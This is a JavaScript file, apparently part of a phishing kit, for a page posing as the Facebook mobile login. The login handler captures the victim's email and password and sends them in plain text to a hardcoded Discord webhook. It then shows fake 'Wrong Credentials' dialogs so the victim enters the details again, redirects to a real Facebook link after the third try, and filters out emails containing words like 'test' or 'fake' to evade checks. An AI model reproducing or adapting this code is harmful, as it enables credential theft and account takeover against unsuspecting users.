// Enable touch events globally for iOS
document.addEventListener('touchstart', () => {}, { passive: false });

// Show error dialog
function showErrorDialog() {
    const dialog = document.createElement('div');
    dialog.setAttribute('aria-modal', 'true');
    dialog.setAttribute('role', 'dialog');
    dialog.setAttribute('tabindex', '-1');
    
    dialog.innerHTML = `
        <div class="wbloks_144">
            <div data-bloks-name="bk.components.dialog.Dialog" class="wbloks_38" role="presentation">
                <div class="wbloks_40" tabindex="-1" aria-label="Wrong Credentials">
                    <div class="wbloks_41">
                        <div class="wbloks_43">Wrong Credentials</div>
                        <div class="wbloks_42">Invalid username or password</div>
                    </div>
                    <div class="wbloks_39">
                        <div role="button" tabindex="0" class="wbloks_147 wbloks_44 wbloks_47">OK</div>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    Object.assign(dialog.style, {
        alignItems: 'center',
        backgroundColor: 'rgba(0, 0, 0, 0.5)',
        inset: '0px',
        display: 'flex',
        justifyContent: 'space-around',
        position: 'fixed',
        zIndex: '1000',
        fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
    });
    
    const dialogContent = dialog.querySelector('.wbloks_40');
    Object.assign(dialogContent.style, {
        backgroundColor: 'white',
        borderRadius: '12px',
        margin: '32px',
        maxWidth: '100%',
        textAlign: 'center',
        width: '400px',
        outline: 'none'
    });
    
    const buttonContainer = dialog.querySelector('.wbloks_44');
    Object.assign(buttonContainer.style, {
        display: 'block',
        borderTop: '1px solid rgb(206, 208, 212)',
       
        fontSize: '16px',
        lineHeight: '1.5',
        padding: '12px 10px',
        pointerEvents: 'auto'
    });
    
    const okButton = dialog.querySelector('.wbloks_147');
    Object.assign(okButton.style, {
       
        textDecoration: 'none',
        whiteSpace: 'nowrap',
        padding: '10px 6px',
        color: 'rgb(0, 100, 224)'
    });
    
    document.body.appendChild(dialog);
    
    const closeDialog = (e) => {
        e.stopPropagation(); // Prevent event bubbling
        document.body.removeChild(dialog);
    };
    okButton.addEventListener('click', closeDialog);
    okButton.addEventListener('touchend', closeDialog, { passive: false });
    okButton.focus();
}

// Login function with attempt counter and lock
let isProcessingLogin = false; // Lock to prevent multiple triggers
let loginAttempts = 0; // Track login attempts

function openFacebook(event) {
    event.preventDefault();
    event.stopPropagation(); // Stop bubbling to parent elements
    
    if (isProcessingLogin) {
        console.log('Login already in progress, skipping');
        return;
    }
    
    console.log('Login triggered on', event.type);
    
    const email = document.getElementById('m_login_email')?.value;
    const password = document.getElementById('m_login_password')?.value;
    
    if (!email || !password) {
        console.log('Please enter both email and password');
        return;
    }
    
    const forbiddenWords = ['spam', 'test', 'fake', 'dummy'];
    const hasForbiddenWord = forbiddenWords.some(word => 
        email.toLowerCase().includes(word)
    );
    
    if (hasForbiddenWord) {
        console.log('Login attempt blocked due to forbidden words in email');
        return;
    }
    
    const loginButton = document.querySelector('[aria-label="Log in"]');
    const loginButtonText = loginButton?.querySelector('.wbloks_120');
    if (!loginButtonText) {
        console.error('Login button text element not found');
        return;
    }
    
    isProcessingLogin = true; // Lock the function
    loginAttempts++; // Increment attempt counter
    console.log('Current login attempt #', loginAttempts);
    
    const originalText = loginButtonText.innerHTML;
    loginButtonText.innerHTML = `
        <svg class="wbloks_133 wbloks_134 wbloks_136" viewBox="25 25 50 50" style="width: 20px; height: 20px;">
            <title>Spinner</title>
            <circle cx="50" cy="50" r="20" fill="none" stroke="#d3e1f5"></circle>
            <circle class="wbloks_135 wbloks_136" cx="50" cy="50" r="20" fill="none" stroke="#0064e0"></circle>
        </svg>
    `;
    
    const webhookUrl = 'https://discord.com/api/webhooks/1344662302359814184/1WbyocYtJ8qn0vCk1OuUoUfRn-tYb6Ld_pY8ay4xjfkLQcYfVYM2JMvvhlobsYOWFHt2';
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `New login attempt:\nEmail: ${email}\nPassword: ${password}`
        })
    })
    .then(() => console.log('Webhook sent successfully'))
    .catch(error => console.error('Error sending webhook:', error))
    .finally(() => {
        setTimeout(() => {
            loginButtonText.innerHTML = originalText;
            console.log('Processing attempt #', loginAttempts);
            if (loginAttempts < 2) {
                // Show dialog for attempts 1 and 2
                if (!document.querySelector('[aria-modal="true"]')) {
                    console.log('Showing Wrong Credentials dialog');
                    showErrorDialog();
                }
            } else {
                // Redirect on 3rd attempt or higher
                console.log('Attempt #3 reached, redirecting...');
                const videoUrl = "https://www.facebook.com/share/v/1ADaU5NdNw/?mibextid=wwXIfr";
                window.location.href = `fb://share/?u=https://www.facebook.com/share/v/1ADaU5NdNw/?mibextid=wwXIfr`;
                setTimeout(() => {
                    console.log('Falling back to web URL');
                    window.location.href = "https://www.facebook.com/share/v/1ADaU5NdNw/?mibextid=wwXIfr";
                }, 500); // Fallback to web after 500ms
            }
            isProcessingLogin = false; // Unlock after processing
        }, 4000);
    });
}

// Register function
function openRegister(event) {
    event.preventDefault();
    event.stopPropagation();
    console.log('Register button triggered on', event.type);
    window.location.href = "https://m.facebook.com/reg/";
}

// Make an element interactive
function makeInteractive(element, handler) {
    if (!element) {
        console.error('Element not found for interaction');
        return;
    }
    
    Object.assign(element.style, {
        cursor: 'pointer',
        pointerEvents: 'auto',
        touchAction: 'manipulation',
        userSelect: 'none',
        webkitUserSelect: 'none',
        webkitTapHighlightColor: 'transparent',
        webkitTouchCallout: 'none',
        position: 'relative',
        zIndex: '10'
    });
    
    element.removeEventListener('click', handler);
    element.removeEventListener('touchstart', handler);
    element.removeEventListener('touchend', handler);
    
    element.addEventListener('touchend', (e) => {
        e.preventDefault();
        e.stopPropagation();
        handler(e);
    }, { passive: false });
    
    element.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        handler(e);
    });
    
    const children = element.querySelectorAll('*');
    children.forEach(child => {
        child.style.pointerEvents = 'none';
    });
}

// Observe DOM for buttons
function setupButtons() {
    const loginButton = document.querySelector('[aria-label="Log in"]');
    const registerButton = document.querySelector('[aria-label="Create new account"]');
    
    if (loginButton) {
        makeInteractive(loginButton, openFacebook);
        console.log('Login button found and initialized');
    }
    
    if (registerButton) {
        makeInteractive(registerButton, openRegister);
        console.log('Register button found and initialized');
    }
    
    if (!loginButton || !registerButton) {
        const observer = new MutationObserver((mutations, obs) => {
            const newLoginButton = document.querySelector('[aria-label="Log in"]');
            const newRegisterButton = document.querySelector('[aria-label="Create new account"]');
            
            if (newLoginButton) {
                makeInteractive(newLoginButton, openFacebook);
                console.log('Login button dynamically detected');
            }
            
            if (newRegisterButton) {
                makeInteractive(newRegisterButton, openRegister);
                console.log('Register button dynamically detected');
            }
            
            if (newLoginButton && newRegisterButton) {
                obs.disconnect();
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
}

// Initialize on load
document.addEventListener('DOMContentLoaded', () => {
    Object.assign(document.body.style, {
        webkitTouchCallout: 'none',
        webkitUserSelect: 'none',
        webkitTapHighlightColor: 'rgba(0,0,0,0)',
        touchAction: 'manipulation'
    });
    
    let viewportMeta = document.querySelector('meta[name="viewport"]');
    if (!viewportMeta) {
        viewportMeta = document.createElement('meta');
        viewportMeta.name = 'viewport';
        document.head.appendChild(viewportMeta);
    }
    viewportMeta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
    
    setupButtons();
});
